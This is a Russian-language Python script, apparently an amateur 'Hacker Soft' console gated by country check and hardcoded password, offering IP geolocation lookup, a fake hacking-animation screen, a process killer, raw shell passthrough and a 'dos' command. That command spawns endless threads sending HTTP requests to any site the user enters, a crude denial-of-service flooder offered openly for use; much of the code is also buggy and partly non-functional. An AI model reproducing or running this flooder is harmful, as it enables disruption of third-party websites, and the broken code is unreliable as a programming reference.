t1 = input
t2 = print

try:  
    from datetime import datetime
    from colorama import init
    import requests 
    import time 
    import random
    global get_ip 
    init()
    response = requests.get(f'http://ipinfo.io/json' )
    user_country = response.json()[ 'country' ] 
    if user_country == 'UA':
        t2('Вы в Украине!, значит программу можно использовать')
        def pr1nt():
            t2(t1('Что вы хотите вывести в консоль?'))

        def time123():
            current_datetime = datetime.now()
            t2(current_datetime)

        def ip():
            import requests 
            import time 
            import random 
            global get_ip 
            get_ip = t1('[+] IP > > > ') 
            def load(): 
                m = 0 
                q = random.randint(1,6) 
                t2("") 
                while m != q: 
                    time.sleep(0.5) 
                    t2("loading...") 
                    m += 1 
            def info(): 
                load() 
                response = requests.get(f'http://ipinfo.io/{ get_ip }/json' ) 

                user_ip = response.json()[ 'ip' ] 
                user_city = response.json()[ 'city' ]  
                user_region = response.json()[ 'region' ] 
                user_country = response.json()[ 'country' ]  
                user_location = response.json()[ 'loc' ]  
                user_org = response.json()[ 'org' ]  
                user_timezone = response.json()[ 'timezone' ] 
                global all_info 
                all_info = f'Fore.RED + \n<Info>\nIP : { user_ip }\nСити : { user_city }\nРегион : { user_region }\nСтрана : { user_country }\nЛокация : { user_location }\nОгранизация : { user_org }\nЗона : { user_timezone }' 
                t2( all_info ) 
            def record(): 
                user_record = '\n[?] Сохранить в текстовом документе? (д/н): ' 
                if user_record == 'д':  
                    g = random.randint(0,10000) 
                    file = open( 'ip_data'+str(g)+'.txt', 'a' ) #вся инфа в файле ip.txt 
                    file.write( f'{ all_info }\n' ) 
                    t2(g + str(' --- Номер подписи файла'))
                    file.close() 
                elif user_record == 'н':  
                    t2( '\n<O.K>' ) 
                else:
                    t2('\r')
            def main():  
                info() 
                record() 
            main()
            t2('Данная функция ещё не доработана')
        def numinfo():
            t2('It`s command dont work...')
        def ddos_attack():
            import threading
            import requests
            site = t1('[+] Site : ')
            zapross = t1('Колличество входов(Не больше 100)')
            asdf = zapross.isdigit() 
            def ddos_attack_start():
                a = 0
                while a != zapross:
                    def dos():
                        while True:
                            requests.get(site)

                    while True:
                        threading.Thread(target=dos).start()
                    a += 1
                    t2(a)
            if asdf == 'False':
                t2('[+] Error > Это не число')
            elif int(zapross) > 100:
                t2('[+] Error > Ваше устройство не поддерживает больше 100 входов!')
            elif int(zapross) < 0:
                t2('[+] Число должно быть больше нуля!')
            else:
                ddos_attack_start()


        def colortxtx():
            from colorama import init, Fore
            from colorama import Back
            from colorama import Style
            init(autoreset=True)
        def kill():
            from sys import platform
            if platform == "linux" or platform == "linux2":
                t2('Простите данная функция поддерживается только на Windows')
            elif platform == "darwin":
                t2('Простите данная функция поддерживается только на Windows')
            elif platform == "win32":
                t2('windows')
                #os.system("TASKKILL /F /IM python.exe")
                import re

                from subprocess import Popen, PIPE, check_output

                def get_processes_running():
                    
                    tasks = check_output(['tasklist']).decode('cp866', 'ignore').split("\r\n")
                    p = []
                    for task in tasks:
                        m = re.match(b'(.*?)\\s+(\\d+)\\s+(\\w+)\\s+(\\w+)\\s+(.*?)\\s.*', task.encode())
                        if m is not None:
                            p.append({"image":m.group(1).decode(),
                                        "pid":int(m.group(2).decode()),
                                        "session_name":m.group(3).decode(),
                                        "session_num":int(m.group(4).decode()),
                                        "mem_usage":int(m.group(5).decode('ascii', 'ignore'))
                                        })
                    return(p)
                def testsdf():
                    print(*[line.decode('cp866', 'ignore') for line in Popen('tasklist', stdout=PIPE).stdout.readlines()])
                
                    lstp = get_processes_running()
                    for p in lstp:
                        print(p)
                    return
                testsdf()
                get_processes_running()
                killprocess = t1('Введите название процесса, который хотите убить')
                os.system("TASKKILL /F /IM " + str(killprocess))
        def hacksim():
            e = 0
            import random
            from colorama import init, Fore
            from colorama import Back
            from colorama import Style
            init(autoreset=True)
            asd = t1('Сколько раз повторить цикл симуляции взлома\nВведите 0 чтобы это продолжалось бесконечно (Для того чтобы закончить цикл перезапустите консоль)\n[+] t1:  ')
            import time
            qdk = 0
            try:
                if int(asd) == 0:
                    qdk = 0
                    while 1:
                        z = random.randint(0,1)
                        x = random.randint(0,1)
                        c = random.randint(0,1)
                        v = random.randint(0,1)
                        a = str(z) + str(x) + str(c) + str(v)
                        d = str(a) * 2
                        t2(Fore.GREEN + '' + str(d))
                        t2(' ')
                        frazal = [Fore.RED + 'key list --Tachback error-- [Empty]', Fore.BLUE + 'Hacking-- n.s /d /a /c /r /t','Connect','Allram','dyrectory -- s -- Data/ad --= not found',Fore.CYAN + 'PassSharing -- s -- d -- f -- g -- b --','data/save/save.sav --  { Reset }', 'Key werificated', Fore.BLUE + 'Поиск уязвимостей', Fore.RED + '-- Tachback error --', Fore.RED + '-- Syntax Error --', Fore.RED + 'Expected [Exec variablity]',Fore.RED + 'Password is not defined']
                        g = random.randint(0,11)
                        fraza = frazal[int(g)]
                        t2(Fore.GREEN + str(fraza))
                        t2(' ')
                        time.sleep(0.01)
                        if qdk <= 10:
                            qdk = qdk + 1
                        else:
                            os.system('cls||clear')
                            qdk = 0


                else:
                    for e in range(int(asd)):
                        z = random.randint(0,1)
                        x = random.randint(0,1)
                        c = random.randint(0,1)
                        v = random.randint(0,1)
                        a = str(z) + str(x) + str(c) + str(v)
                        d = str(a) * 2
                        t2(Fore.GREEN + '' + str(d))
                        t2(' ')
                        frazal = [Fore.RED + 'key list --Tachback error-- [Empty]', Fore.BLUE + 'Hacking-- n.s /d /a /c /r /t','Connect','Allram','dyrectory -- s -- Data/ad --= not found',Fore.CYAN + 'PassSharing -- s -- d -- f -- g -- b --','data/save/save.sav --  { Reset }', 'Key werificated', Fore.BLUE + 'Поиск уязвимостей', Fore.RED + '-- Tachback error --', Fore.RED + '-- Syntax Error --', Fore.RED + 'Expected [Exec variablity]',Fore.RED + 'Password is not defined']
                        g = random.randint(0,11)
                        fraza = frazal[int(g)]
                        t2(Fore.GREEN + str(fraza))
                        t2(' ')
                        time.sleep(0.01)
                        if qdk <= 10:
                            qdk = qdk + 1
                        else:
                            os.system('cls||clear')
                            qdk = 0
            except:
                t2(Fore.RED + 'Произошла непредвиденная ошибка, скорее всего вы ввели строковое значение вместо числового.')


        import os
        from colorama import init, Fore
        from colorama import Back
        from colorama import Style
        import time
        init(autoreset=True)
        try:
            f = open('DontDelereThisFilePython.txt')
            f.close()
            t2('Так как файлы модулей имуются ничего устанавливатся не будет\n[P.S] Если произойдёт ошибка попробуйте удалить файл DontDelereThisFilePython.txt')
        except FileNotFoundError:
            t2('У вас не установлены модули!')
            time.sleep(3)
            t2('installed 1/7')
            time.sleep(0.09)
            os.system('cls||clear')
            os.system('pip install colorama')
            t2('installed 2/7')
            os.system('cls||clear')
            os.system('pip install json')
            t2('installed 3/7')
            os.system('cls||clear')
            os.system('pip install requests')
            t2('installed 4/7')
            os.system('cls||clear')
            os.system('pip install urllib.request')
            t2('installed 5/7')
            os.system('cls||clear')
            os.system('pip install get_ip')
            t2('installed 6/7')
            os.system('cls||clear')
            os.system('pip install os')
            t2('installed 7/7')
            os.system('cls||clear')
            os.system('cls||clear')
            
            my_file = open("DontDelereThisFilePython.txt", "w+")
            my_file.write('Удалив данный файл установка модулей начнётся с нуля')
            t2("Был создан файл DontDelereThisFilePython.txt, \nне удаляйте его ато установка начнётся заного")
            my_file.close()
        version = '5.0 [F1]'
        d = Fore.GREEN + '―'
        cl = Fore.WHITE
        def loading():
            init(autoreset=True)
            l = 2.8
            t2('\r[' + d + cl +'――――――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d + cl +'―――――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d +d + d + cl +'――――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d + cl +'―――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  cl +'――――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d +  d +  d +  d +  d +  d +  d + cl +'――――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d + cl +'――――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―――――――]' + str(int(l)+2.8) + "%", end = '')
            l = l + 2.8
            time.sleep(0.2)
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'――――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'—――――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'—―――]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―—―]' + str(int(l)+2.8) + "%", end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  cl +'―—]', end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2('\r[' + d + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d  + d + cl +'—]', end = '')
            time.sleep(0.2)

            t2('\r[' + d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d +  d, end = '')
            time.sleep(0.2)
            l = l + 2.8
            t2(Fore.GREEN + '\r' + cl +'[' + Fore.GREEN + '―――――――――――――――――――――――――――――――――――' + cl + ']' + "100 %")

            time.sleep(0.2)
            t2(Fore.BLUE + '\r[Loaded, connecting to Hacking libery]')
            time.sleep(2)
        loading()
        passchek = t1('Введите пароль [?] > > > ')
        os.system('cls||clear')

        m = 1
        if passchek == '66572986':
            t2(Fore.LIGHTCYAN_EX + 'Hacker Soft\nVersion: ' + str(version) + '\nMeade by Limeek             Telegram: @L1meek')
            while m:
                g = '$ --- '
                cmd = t1(Fore.BLUE + str(g))
                if cmd == 'ip' or cmd == 'getip' or cmd == 'iphack':
                    ip()
                elif cmd == 'github':
                    t2('Данный проект на github\n[+] -- https://github.com/LimeekBro/CMDPRO -- [+]')
                elif cmd == 't2':
                    pr1nt()
                elif cmd == 'numinfo' or cmd == 'ninfo' or cmd == 'nuberhack' or cmd == 'phoneinfo':
                    numinfo()
                elif cmd == 'Ddos' or cmd == 'dos' or cmd == 'dosatack':
                    ddos_attack()
                elif cmd == 'exit' or cmd == 'end' or cmd == 'exit()':
                    m = 0
                elif cmd == 'cls' or cmd == 'clear':
                    import os
                    os.system('cls||clear')
                elif cmd == 'os':
                    try:
                        cmd1 = t1(Fore.YELLOW + 'Введите команду > > >')
                        if cmd1 == 'python':
                            t2('Нельзя вызвать пайтон в пайтоне!')
                        elif cmd1 == 'cmd':
                            t2('Неизвестная ошибка')
                        else:
                            os.system(cmd1)
                    except:
                        t2('Error [' + Fore.RED + '!' + Fore.WHITE + '] +' + Fore.RED + ' Вы ввели недопустимую команду!')
                elif cmd.startswith("open"):
                    if cmd.endswith("com") or cmd.endswith("ua") or cmd.endswith("ru") or cmd.endswith("org"):
                        import webbrowser
                        words = cmd.split(' ')
                        fragment = ''
                        new_words = []
                        for word in words:
                            if fragment not in word:
                                 new_words.append(word)
                        new_words
                        ' '.join(new_words)

                        webbrowser.open(word, new=1, autoraise=True)
                    if cmd.endswith(".py"):
                        import os
                        words = cmd.split(' ')
                        fragment = 'пере'
                        new_words = []
                        for word in words:
                             if fragment not in word:
                                 new_words.append(word)
                        new_words
                        ' '.join(new_words)
                        os.startfile(word)
                elif cmd == 'iplogger':
                        import os
                        import webbrowser
                        word = 'https://iplogger.org'
                        webbrowser.open(word, new=1, autoraise=True)
                elif cmd == 'help':

                    t2('Данная программа постоянно будет обновлятся на github,\nтак как программа является хакерской она будет доступна только в регионах UA\nПароль сообщается только девереным лицам, а шифр убрать невозможно!')
                    help1 = t1('Хотите получить список коданд [y/n]')
                    if help1 == 'y':
                        t2('Наша консоль пока не доработана до конца но имеет команды:\nIp - Выводит информацию по введенному ip\nNumInfo - Выводит всю информацию по номеру телефона(!Не работает)\niplogger - открывает сайт iplogger.com\ndos - Эта функция позволит вам отправить от 1 до 100 входов на сайт с вашего ip(Скоро будет добавлен Vpn)\nopen - позволяет открыть сайт через главный браузер в системе\nos - функция по факту покажется бесполезной, однако с помощью неё вы можете открыть файл python или скачать модуль(pip)\nCls - если ваша консоль засорилась очистить её будет не проблема\nExit - завершить наш скрипт можно только так или закрыв полностью пайтон\nHackSimulation - функция позволит превратить себя в вооброжаемого хакера:)\nПока на этом всё, опять же на https://github.com/LimeekBro/CMDPRO вы всегда сможете обновить скрипт!\nДля того что-бы запустить скрипт на телефоне можно использовать pydroid или termux, что-бы узнать как запустить в termux или pydroid файл, пропишите android')
                elif cmd == 'hacksimulation':
                    hacksim()
                elif cmd == 'android':
                    andter = t1('У вас имеется termux? [y/n]')
                    if andter == 'y':
                        t2('Откройте термукс\nПишите следующие команды\npkg intall python\npkg install git\ngit clone https://github.com/LimeekBro/CMDPRO\ncd CMDPRO\npython main.py\nГотово! удачного хакинга')
                    else:
                        t2('Так как у вас нету termux(Вы можете его скачать)\nДля того чтобы использовать pydroid\nВам понадобится вручную скачать файл main.py по ссылке https://github.com/LimeekBro/CMDPRO\nПотом запустить его через pydroid')
                elif cmd == 'update':
                    t2('    --Обновление--\nОптимизация размера кода\n  Новая команда update\n  Обновлено сообщение Error\nИсправление некоторых ошибок \nДобавлена команда kill(BETA)\nОбновление дизайна\тНовая команда github\n--Версия ' + version + '--')
                elif cmd == 'kill':
                    kill()
                else:
                    t2('Error [' + Fore.RED + '!' + Fore.BLUE + '] ' + Fore.RED + ' Вы ввели недопустимую команду!' + Fore.BLUE + '[' + Fore.RED +str(cmd) + Fore.BLUE + ']')
        else:
            t2('Error: Отказано в доступе')
    else:
        t2('Программу можно использовать только в Украине! Если вы находитесь в Украине и программа не работает то попробуйте отключить VPN.\n Програма не должна использоватся в корыстных целях!')
except:
    t2('Произошла непредвиденная ошибка\nНе вините себя скорее всего ошибка в исходном коде\nОбратитесь за помощью Telegram: @L1meek\nНапишите коментарий "L1meek i`m a have error"')